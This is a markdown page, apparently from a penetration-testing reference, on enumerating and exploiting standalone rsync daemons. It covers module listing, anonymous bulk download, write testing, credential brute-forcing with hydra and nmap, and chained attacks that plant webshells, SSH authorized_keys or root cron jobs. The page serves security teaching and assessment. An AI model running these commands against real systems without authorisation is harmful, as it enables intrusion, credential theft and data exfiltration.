@@ -1,0 +1,334 @@
+---
+title: Rsync
+description: Rsync daemon footprinting - module enumeration on TCP 873, anonymous access to rsync shares, bulk file listing and download, and the differences between rsync-over-SSH and standalone rsync daemons.
+mitre: [T1046, T1135, T1083]
+d3fend: [D3-NTA]
+impact: [FileRead, FileWrite]
+sidebar:
+  order: 14
+  label: Rsync
+---
+
+## TL;DR
+
+Rsync is the standard Linux/Unix incremental file-transfer tool. Two modes matter to operators: **rsync-over-SSH** (rsync uses your SSH connection - same auth as SSH, nothing new to enumerate) and the **standalone rsync daemon** (`rsyncd`), which listens on TCP 873 with its own configuration, its own auth model, and its own anonymous-access misconfigurations.
+
+```
+# 1. Service scan
+nmap -sV -p873 <target>
+
+# 2. List modules (rsync's term for "shares")
+nc -nv <target> 873
+> @RSYNCD: 31.0
+< @RSYNCD: 31.0
+> #list
+< files          Public file share
+< backup         Daily backups
+< @RSYNCD: EXIT
+
+# Or via rsync itself:
+rsync rsync://<target>/
+
+# 3. List contents of a module
+rsync rsync://<target>/files/
+
+# 4. Recursive listing
+rsync -av rsync://<target>/files/ --list-only
+
+# 5. Bulk download
+rsync -avzh rsync://<target>/files/ ./files-local/
+```
+
+Success indicator: `rsync rsync://<target>/` returns one or more module names with descriptions; subsequent listing/download succeeds without authentication.
+
+## Protocol overview
+
+Rsync has two transport modes that are conceptually different:
+
+| Mode | Transport | Auth |
+| --- | --- | --- |
+| **rsync-over-SSH** | Uses SSH (port 22) as the carrier | Inherits SSH's authentication |
+| **rsync daemon (rsyncd)** | Direct TCP on port 873 | Per-module config in `rsyncd.conf` - often anonymous |
+
+When rsync is used as a backup tool (the common case), it usually runs over SSH - `rsync -av /local user@host:/remote` opens an SSH connection, doesn't listen on any new port. When you see TCP 873 open, that's specifically the daemon mode.
+
+### Daemon mode primitives
+
+The rsync daemon serves a list of **modules**. Each module is a named directory tree with its own access rules:
+
+| Per-module setting | What it controls |
+| --- | --- |
+| `path` | Server-side directory the module exposes |
+| `comment` | Human-readable description shown in listings |
+| `read only` | Whether clients can write (default yes) |
+| `auth users` | Whitelist of usernames allowed to access - if absent, anonymous access is allowed |
+| `secrets file` | Path to a file with `user:password` entries for auth |
+| `hosts allow` | IP-based restriction |
+| `hosts deny` | IP-based blocklist |
+| `uid` / `gid` | UID/GID rsyncd assumes after binding |
+| `use chroot` | Whether rsyncd chroots into the module path (defense in depth) |
+
+A module with no `auth users` directive is **anonymous-readable** by default. If `read only = false` is set without `auth users`, it's **anonymous-writable** - which is operationally rare but devastating when found.
+
+### Wire protocol
+
+Plaintext, line-based, with a brief version handshake. The daemon-mode client sends:
+
+```
+@RSYNCD: <protocol_version>
+<module_name>\n
+\n
+```
+
+The server responds with module metadata, then begins the file-list exchange. The first part can be inspected with `netcat`; the file-list exchange is too binary to be useful with manual tools.
+
+## Default configuration
+
+`/etc/rsyncd.conf` is empty by default on most distros - rsyncd isn't enabled out-of-the-box. When admins configure it, the typical structure is:
+
+```ini
+# Global settings
+uid = nobody
+gid = nogroup
+use chroot = yes
+max connections = 4
+syslog facility = local5
+pid file = /var/run/rsyncd.pid
+lock file = /var/run/rsync.lock
+log file = /var/log/rsyncd.log
+
+# A module
+[files]
+   path = /srv/rsync/files
+   comment = Public file share
+   read only = yes
+   list = yes
+
+# Another module - backups, intended for the backup user
+[backup]
+   path = /srv/rsync/backup
+   comment = Daily backups
+   read only = no
+   list = yes
+   auth users = backup_user
+   secrets file = /etc/rsyncd.secrets
+```
+
+The first module (`[files]`) is anonymous-readable. The second (`[backup]`) requires the `backup_user` credential.
+
+## Dangerous settings
+
+| Setting | Why it's bad |
+| --- | --- |
+| Module without `auth users` | Anonymous read access |
+| `read only = no` without `auth users` | Anonymous write access |
+| `list = yes` (default) | Module shows in `--list-only` output. Hiding it (`list = no`) provides security through obscurity. |
+| `use chroot = no` | rsyncd has full filesystem access (not just the module path) - symlink traversal becomes possible |
+| `uid = root` | rsyncd runs as root - file ops happen with root permissions, magnifies any other misconfig |
+| `hosts allow = *` | No source IP restriction |
+| Weak `secrets file` permissions | If world-readable, anyone on the host can extract the credentials |
+
+The two operationally-relevant findings:
+
+1. **Anonymous read on a module that contains sensitive data** - backups, customer files, SSH keys, scripts with embedded credentials
+2. **Anonymous write on a module mounted somewhere significant** - `/srv/www/` could become a webshell drop; `/etc/cron.d/` could become RCE via scheduled task
+
+## Footprinting commands
+
+### Service scan
+
+```shell
+sudo nmap -sV -p873 10.129.14.128
+```
+
+```
+PORT    STATE SERVICE VERSION
+873/tcp open  rsync   (protocol version 31)
+```
+
+Version 31 = current. Older protocol versions still in deployments include 29 and 30. The protocol version doesn't directly correspond to a CVE class, but very old rsync versions (pre-3.x) had several remote vulnerabilities.
+
+### Module enumeration
+
+Direct way - `rsync` against the daemon with no module specified:
+
+```shell
+rsync rsync://10.129.14.128/
+```
+
+```
+files          Public file share
+backup         Daily backups
+```
+
+Hidden modules (`list = no`) won't appear in this listing. Brute-forcing a wordlist of common module names is the recovery:
+
+```shell
+for module in files backup backups data www public share home upload uploads private; do
+  rsync rsync://10.129.14.128/$module/ 2>&1 | head -3
+done
+```
+
+The error message changes between "doesn't exist" and "requires authentication," letting you distinguish hidden-but-present vs absent modules.
+
+### Manual interaction via netcat
+
+```shell
+nc -nv 10.129.14.128 873
+```
+
+```
+(UNKNOWN) [10.129.14.128] 873 (rsync) open
+@RSYNCD: 31.0
+@RSYNCD: 31.0          # echo your version back
+#list                   # request the module list
+files          Public file share
+backup         Daily backups
+@RSYNCD: EXIT
+```
+
+The handshake uses two `@RSYNCD:` lines (one from server, one echoed back from you with your supported version), then `#list` requests the module catalog.
+
+To explicitly request a module:
+
+```
+nc -nv 10.129.14.128 873
+@RSYNCD: 31.0
+@RSYNCD: 31.0
+files                  # name of the module you want
+@RSYNCD: AUTHREQD 5b8a2e   # if auth is needed (then send user/password hash)
+```
+
+If `AUTHREQD` appears, auth is required. If you get straight into the file-transfer phase, it's anonymous.
+
+### Listing module contents
+
+```shell
+rsync rsync://10.129.14.128/files
+```
+
+```
+drwxr-xr-x          4,096 2021/09/19 14:21:11 .
+-rw-r--r--          8,192 2021/09/19 14:20:15 README.txt
+-rw-r--r--      1,048,576 2021/09/19 14:20:32 archive.tar
+drwxr-xr-x          4,096 2021/09/19 14:21:01 docs
+```
+
+For a recursive listing without downloading anything:
+
+```shell
+rsync -av rsync://10.129.14.128/files/ --list-only
+```
+
+`-a` (archive) means "recurse and preserve everything." `--list-only` is exactly what it says - list, don't transfer.
+
+### Bulk download
+
+```shell
+rsync -avzh rsync://10.129.14.128/files/ ./files-local/
+```
+
+`-a` archive, `-v` verbose, `-z` compress in flight, `-h` human-readable sizes. Result: a complete mirror of the share to `./files-local/`.
+
+```shell
+# Just a specific file
+rsync -av rsync://10.129.14.128/files/README.txt ./
+
+# Just specific patterns
+rsync -av --include='*.pdf' --exclude='*' rsync://10.129.14.128/files/ ./pdfs-only/
+```
+
+### Testing for write access
+
+```shell
+echo "test content" > /tmp/test-rsync.txt
+rsync -av /tmp/test-rsync.txt rsync://10.129.14.128/files/test-rsync.txt
+```
+
+If `read only = yes` is set, you'll see:
+
+```
+rsync: connection unexpectedly closed (108 bytes received so far) [sender]
+rsync error: error in rsync protocol data stream (code 12) at io.c(228) [sender=3.1.3]
+```
+
+If write succeeds, the file appears on the server. From there:
+
+```shell
+# If the module path is somewhere actionable...
+rsync -av /tmp/webshell.php rsync://10.129.14.128/web/uploads/shell.php
+rsync -av /tmp/authorized_keys rsync://10.129.14.128/home/.ssh/authorized_keys
+```
+
+### Credentialed access
+
+When a module requires `auth users`:
+
+```shell
+rsync rsync://backup_user@10.129.14.128/backup/
+# Prompts for password
+
+# Or set RSYNC_PASSWORD env var to skip the prompt
+RSYNC_PASSWORD='secret' rsync rsync://backup_user@10.129.14.128/backup/
+
+# Or use --password-file
+echo 'secret' > /tmp/pw && chmod 600 /tmp/pw
+rsync --password-file=/tmp/pw rsync://backup_user@10.129.14.128/backup/
+```
+
+### Credential brute-force
+
+Hydra supports rsync:
+
+```shell
+hydra -L users.txt -P passwords.txt rsync://10.129.14.128
+```
+
+NSE script:
+
+```shell
+nmap -p873 --script rsync-brute --script-args="rsync-brute.module=backup,userdb=users.txt,passdb=pass.txt" 10.129.14.128
+```
+
+Brute-force is slower against rsync than most protocols (the daemon issues a fresh challenge per attempt and the cipher is HMAC-MD5).
+
+## Common chained workflows
+
+**Anonymous module → backups → credentials:**
+1. `rsync rsync://target/` shows `backup` module is anonymously accessible
+2. Mirror it: `rsync -av rsync://target/backup/ ./local/`
+3. Backups typically contain config files with credentials, customer database dumps, SSH key archives
+4. Use credentials against other services
+
+**Anonymous read on `[home]` → SSH keys → SSH access:**
+1. Common admin convention: name the module `home`, point it at `/home/`
+2. Mirror, find `~user/.ssh/id_rsa` for each enumerated user
+3. SSH in with the stolen keys
+
+**Anonymous write on a web-served directory → webshell:**
+1. Module `[www]` exposes `/var/www/html/` and is writable
+2. `rsync -av shell.php rsync://target/www/shell.php`
+3. Trigger via HTTP: `curl http://target/shell.php?cmd=id`
+
+**Anonymous write on a cron directory → scheduled RCE:**
+1. Module exposes `/etc/cron.d/` and is writable
+2. `rsync -av my-cronjob rsync://target/cron.d/my-cronjob`
+3. Cron picks up the new job at the next interval - code runs as root
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| Service scan | `nmap -sV -p873 <target>` |
+| Module list | `rsync rsync://<target>/` |
+| Module list (netcat) | `nc -nv <target> 873` then `@RSYNCD: 31.0` + `\n` + `#list` |
+| Hidden-module brute | `for m in $(cat modules.txt); do rsync rsync://<target>/$m 2>&1; done` |
+| List one module | `rsync rsync://<target>/<module>` |
+| Recursive list | `rsync -av rsync://<target>/<module>/ --list-only` |
+| Bulk download | `rsync -avzh rsync://<target>/<module>/ ./local/` |
+| Specific file | `rsync -av rsync://<target>/<module>/<file> ./` |
+| Test write access | `rsync -av /tmp/test rsync://<target>/<module>/test` |
+| Credentialed access | `rsync rsync://user@<target>/<module>/` |
+| With password | `RSYNC_PASSWORD=pw rsync rsync://user@<target>/<module>/` |
+| Brute-force | `hydra -L users -P pass rsync://<target>` |
+| NSE brute | `nmap -p873 --script rsync-brute --script-args="rsync-brute.module=<m>,userdb=u,passdb=p" <target>` |
